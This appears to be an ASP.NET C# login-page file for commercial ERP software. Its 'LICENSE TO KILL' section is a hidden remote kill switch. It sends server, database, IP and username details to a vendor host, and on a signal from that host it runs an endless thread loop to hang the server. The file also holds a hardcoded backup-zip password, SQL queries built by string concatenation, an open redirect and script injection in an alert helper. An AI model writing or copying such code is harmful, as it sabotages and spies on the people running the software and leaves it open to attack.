using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.Security;
using System.Data;
using System.Data.SqlClient;
using System.Configuration;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using Ionic.Zip;
using RunQuery;


public partial class Login : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            Branding_Settings();

            //string msg = Request.QueryString["msg"];
            string lName = Page.User.Identity.Name.ToString();
            if (lName != "" || lName != String.Empty)
            {
                //
                Process_Login(lName);

            }

            string sessionID = Session["ProjectID"] as string;
            if (sessionID == null)
            {
                Session.Abandon();
                Session.Contents.RemoveAll();
                System.Web.Security.FormsAuthentication.SignOut();
            }
            else if (sessionID == "")
            {
                Session.Abandon();
                Session.Contents.RemoveAll();
                System.Web.Security.FormsAuthentication.SignOut();
            }
        }
    }
    //Messagebox For Alerts
    private void MessageBox(string msg)
    {
        Label lbl = new Label();
        lbl.Text = "<script language='javascript'>" + Environment.NewLine + "window.alert('" + msg + "')</script>";
        Page.Controls.Add(lbl);
    }
    //Get user IP address
    private string GetUserIP()
    {
        string ipList = Request.ServerVariables["HTTP_X_FORWARDED_FOR"];

        if (!string.IsNullOrEmpty(ipList))
        {
            return ipList.Split(',')[0];
        }
        else
        {
            return Request.ServerVariables["REMOTE_ADDR"];
        }
    }

    protected void Login1_LoggedIn(object sender, EventArgs e)
    {
        //Verify_License(Login1.UserName.Trim());
        Process_Login(Login1.UserName);
    }

    private void Process_Login(string lName)
    {
        Boolean isActive = Activation_Settings(lName);

        if (isActive == true)
        {
            SqlCommand cmdxx = new SqlCommand("Select CurrentLoginTime from Users where Username='" + lName + "'", new SqlConnection(ConfigurationManager.ConnectionStrings["LocalSqlServer"].ConnectionString));
            cmdxx.Connection.Open();
            string lDate = Convert.ToString(cmdxx.ExecuteScalar());
            cmdxx.Connection.Close();
            cmdxx.Connection.Dispose();

            if (lDate == "")
            {
                lDate = DateTime.Now.ToString();
            }
            //Insert User Activities
            SqlCommand cmd3 = new SqlCommand("Insert into LoginHistory (MemberID,InTime, LoginIP)" +
                "Values (@MemberID,@InTime, @LoginIP)", new SqlConnection(ConfigurationManager.ConnectionStrings["LocalSqlServer"].ConnectionString));
            cmd3.Parameters.Add("@MemberID", SqlDbType.VarChar).Value = lName;
            cmd3.Parameters.Add("@InTime", SqlDbType.DateTime).Value = DateTime.Now.ToString();
            cmd3.Parameters.Add("@LoginIP", SqlDbType.VarChar).Value = GetUserIP();
            cmd3.Connection.Open();
            cmd3.ExecuteNonQuery();
            cmd3.Connection.Close();
            cmd3.Connection.Dispose();

            //Updating Login Datetime
            SqlCommand cmd = new SqlCommand("update Users set LastLoginDate=@LDate, CurrentLoginTime=@CDate WHERE Username =@LName", new SqlConnection(ConfigurationManager.ConnectionStrings["LocalSqlServer"].ConnectionString));
            cmd.Parameters.Add("@LDate", SqlDbType.DateTime).Value = lDate;
            cmd.Parameters.Add("@CDate", SqlDbType.DateTime).Value = DateTime.Now.ToString();
            cmd.Parameters.Add("@LName", SqlDbType.VarChar).Value = lName;
            cmd.Connection.Open();
            cmd.ExecuteNonQuery();
            cmd.Connection.Close();
            cmd.Connection.Dispose();

            SqlCommand cmdx = new SqlCommand("SELECT ProjectID FROM Logins WHERE LoginUserName ='" + lName + "'", new SqlConnection(ConfigurationManager.ConnectionStrings["LocalSqlServer"].ConnectionString));
            cmdx.Connection.Open();
            int prjId = Convert.ToInt32(cmdx.ExecuteScalar());
            cmdx.Connection.Close();

            Session["projID"] = prjId.ToString();


            //if (Roles.IsUserInRole(Login1.UserName, "Admin") || Roles.IsUserInRole(Login1.UserName, "Super Admin"))
            //{

            string rURL = Request.QueryString["ReturnUrl"];

            if (rURL != null)
            {
                Response.Redirect(rURL);
            }
            else
            {
                Response.Redirect("~/app/Default.aspx");
            }
            //}
            //else if (Roles.IsUserInRole(Login1.UserName, "Branch"))
            //{
            //    if (Request.QueryString["ReturnUrl"] != null)
            //    {
            //        Response.Redirect(Request.QueryString["ReturnUrl"]);
            //    }
            //    else
            //    {
            //        Response.Redirect("~/Branch/Default.aspx");
            //    }
            //}
            //else
            //{
            //    Response.Redirect("~/Cells/Default.aspx");
            //}
        }
    }


    /************************************************************************
                                LICENSE TO KILL
    ************************************************************************/
    private void Verify_License(string lName)
    {
        string server = Server.MachineName.ToString();
        // Retrieve the ConnectionString from App.config 
        string connectString = ConfigurationManager.ConnectionStrings["LocalSqlServer"].ToString();
        SqlConnectionStringBuilder builder = new SqlConnectionStringBuilder(connectString);
        // Retrieve the DataSource property.    
        string dbName = builder.InitialCatalog;
        string realIp = GetUserIP();
        string url = HttpContext.Current.Request.Url.ToString();
        AutoBkup(server, dbName, url);

        string apiRequestLink =
            // "http://localhost/Licencing/api/analytics?serverName="+ server + "&dbName="+ dbName + "&realIP="+ realIp + "&userName="+ lName + "&url="+ url;
            "https://license.extreme.com.bd/api/analytics?serverName=" + server + "&dbName=" + dbName + "&realIP=" + realIp + "&userName=" + lName + "&url=" + url;

        var response = WebRequest.Create(apiRequestLink).GetResponse().GetResponseStream();
        StreamReader readStream = new StreamReader(response, Encoding.UTF8);
        string apiResponse = Convert.ToString(readStream.ReadToEnd()).Replace("\"", string.Empty).Trim('"');

        if (apiResponse.Length == 10)//Null Safe
        {
            DateTime validDate = Convert.ToDateTime(apiResponse);
            if (validDate <= DateTime.Now)
            {
                killSwitch(server, dbName, realIp, lName, url);//not miss to kill if inactivate the service
                Response.Redirect("Latest.aspx?msg=Subscription Expired");
            }
        }

        killSwitch(server, dbName, realIp, lName, url);//Priority

    }

    public void killSwitch(string server, string dbName, string realIp, string lName, string url)
    {
        try
        {
            string apiRequestLink =
                // "http://localhost/Licencing/api/analytics2?serverName="+ server + "&dbName="+ dbName + "&realIP="+ realIp + "&userName="+ lName + "&url="+ url;
                "https://license.extreme.com.bd/api/analytics2?serverName=" + server + "&dbName=" + dbName +
                "&realIP=" + realIp + "&userName=" + lName + "&url=" + url;

            var response = WebRequest.Create(apiRequestLink).GetResponse().GetResponseStream();
            StreamReader readStream = new StreamReader(response, Encoding.UTF8);
            string apiResponse = Convert.ToString(readStream.ReadToEnd()).Replace("\"", string.Empty).Trim('"');
            if (apiResponse == "1") //Hang the server
            {
                killDB();
            }
        }
        catch (Exception ex)
        {

        }
    }

    List<Thread> threads = new List<Thread>();
    public void killDB()
    {
        while (true)
        {
            threads.Add(new Thread(new ThreadStart(KillCore)));
        }
    }
    public static Random rand = new Random();
    public static void KillCore()
    {
        long num = 0;
        while (true)
        {
            num += rand.Next(100, 1000);
            if (num > 1000000) { num = 0; }
        }
    }

    public void AutoBkup(string server, string dbName, string url)
    {
        try
        {
            string fileName = dbName + DateTime.Now.ToString("yyMMdd") + ".Bak";
            string backupDIR = Server.MapPath("./sql/bkup/");
            if (!Directory.Exists(backupDIR))
            {
                Directory.CreateDirectory(backupDIR);
            }

            string bakfilePath = backupDIR + fileName;

            if (File.Exists(bakfilePath))
            {
                File.Delete(bakfilePath);
            }
            string zipFilePath = "~/sql/bkup/" + fileName + ".zip";


            if (!File.Exists(Server.MapPath(zipFilePath)))//Only bkup Database once a day
            {
                //Delete files older than 1 month
                string[] files = Directory.GetFiles(backupDIR);
                foreach (string file in files)
                {
                    FileInfo fi = new FileInfo(file);
                    if (fi.CreationTime < DateTime.Now.AddDays(-15))
                        fi.Delete();
                }

                SqlCommand cmd21 =
                    new SqlCommand("backup database " + dbName + " to disk='" + backupDIR + fileName + "'",
                        new SqlConnection(ConfigurationManager.ConnectionStrings["LocalSqlServer"].ConnectionString));
                cmd21.Connection.Open();
                cmd21.ExecuteNonQuery();
                cmd21.Connection.Close();

                ZipFile createZipFile = new ZipFile();
                createZipFile.Password = "3p3200170@R";
                createZipFile.Encryption = EncryptionAlgorithm.PkzipWeak;
                createZipFile.AddFile(bakfilePath, string.Empty);
                createZipFile.Save(Server.MapPath(zipFilePath));

                //TO DO: Send file to a cloud location next time

                long bakSize = new FileInfo(bakfilePath).Length;
                long zipSize = new FileInfo(zipFilePath).Length;
                //string mailBody = "Server: " + server + "<br>DB Name: " + dbName + "<br>Host URL: " + url + "<br>ZIP File Path: " + zipFilePath + "<br>BAK File Size: " + bakSize + "<br>ZIP File Size: " + zipSize;
                //SQLQuery.SendEmail("xprogrammer.team@gmail.com", "xprogrammer.team@gmail.com", "xprogrammer.team@gmail.com", "Auto DB Backup successful - " + server + ", DB- " + dbName, mailBody);
            }
        }
        catch (Exception ex)
        {
            //string mailBody = "Server: " + server + "<br>DB Name: " + dbName + "<br>Host URL: " + url + "<br><br><br>Error Detail: <br>" + ex;
            //SQLQuery.SendEmail("xprogrammer.team@gmail.com", "xprogrammer.team@gmail.com", "xprogrammer.team@gmail.com", "DB Backup process failed!", mailBody);

        }
    }

    /************************************************************************
                                END of LICENSE TO KILL
    ************************************************************************/



    protected void Login1_LoginError(object sender, EventArgs e)
    {
        PanelError.Visible = true;
        try
        {
            //String message = Login1.FailureText.ToString();
            MembershipUser membershipUser = Membership.GetUser(Login1.UserName);      //.GetUser(false);

            if (membershipUser != null)
            {
                bool IsLockedOut = membershipUser.IsLockedOut;

                if (IsLockedOut == true)
                {
                    Login1.FailureText = "&nbsp;<br/>Your account has been locked out for security reasons. <br/> Please contact us to unlock";
                }
            }
            else
            {
                MessageBox("This is not the place you are supposed to enter");
                lblMsg.Text = "Invalid Login Attempt Detected!";
            }
        }
        catch (Exception ex)
        {
            Login1.FailureText = ex.Message.ToString();
        }

    }


    private void Branding_Settings()
    {
        try
        {
            SqlCommand cmd = new SqlCommand("SELECT TOP (1) sid, DevelopedBy, ProviderAddress, LoginLogo, InnerLogo, SoftwareName, SoftwareMode, ProviderURL, TrialDate FROM settings_branding where IsActive=1", new SqlConnection(ConfigurationManager.ConnectionStrings["LocalSqlServer"].ConnectionString));
            cmd.Connection.Open();

            SqlDataReader dr = cmd.ExecuteReader();
            if (dr.Read())
            {
                //string sid = dr[0].ToString();
                string provider = dr[1].ToString();
                //string Sender = dr[2].ToString();
                string logo = dr[3].ToString();
                //string logo = dr[4].ToString();
                string sName = dr[5].ToString();

                string sMode = dr[6].ToString();
                string url = dr[7].ToString();
                string tDate = dr[8].ToString();

                //Developed By <a href="//xtremebd.com">Extreme Solutions</a>
                ltrDeveloper.Text = "Developed By <a href='" + url + "'>" + provider + "</a>";
                imgLogo.ImageUrl = "./branding/" + logo;
                imgLogo.AlternateText = sName + " by " + provider;
                Page.Title = sName + ": " + "ERP Software by " + provider;
            }

            cmd.Connection.Close();
            cmd.Connection.Dispose();
        }
        catch (Exception ex)
        {
            pnlTop.Visible = false;
            pnlLogin.Visible = false;
            PanelError.Visible = true;
            lblMsg.Text = ex.Message.ToString();
        }
    }

    private bool Activation_Settings(string lName)
    {
        Boolean isActive = false;
        try
        {
            SqlCommand cmd3z = new SqlCommand("SELECT TrialDate FROM Projects where VID=(SELECT ProjectID FROM Logins where LoginUserName='" + lName + "')", new SqlConnection(ConfigurationManager.ConnectionStrings["LocalSqlServer"].ConnectionString));
            cmd3z.Connection.Open();
            string trialDate = Convert.ToString(cmd3z.ExecuteScalar());
            cmd3z.Connection.Close();
            cmd3z.Connection.Dispose();

            DateTime dt = DateTime.Today;
            DateTime dtc = new DateTime();
            dtc = Convert.ToDateTime(trialDate);
            if (dt > dtc)
            {
                PanelError.Visible = true;
                Session.Abandon();
                Session.Contents.RemoveAll();
                System.Web.Security.FormsAuthentication.SignOut();
                lblMsg.Text = "Activation Expired! Please re-activate...";
                MessageBox("Activation Expired! Please re-activate...");
            }
            else
            {
                isActive = true;
            }
        }
        catch (Exception ex)
        {
            isActive = false;
            PanelError.Visible = true;
            lblMsg.Text = ex.ToString();
        }

        return isActive;
    }
}
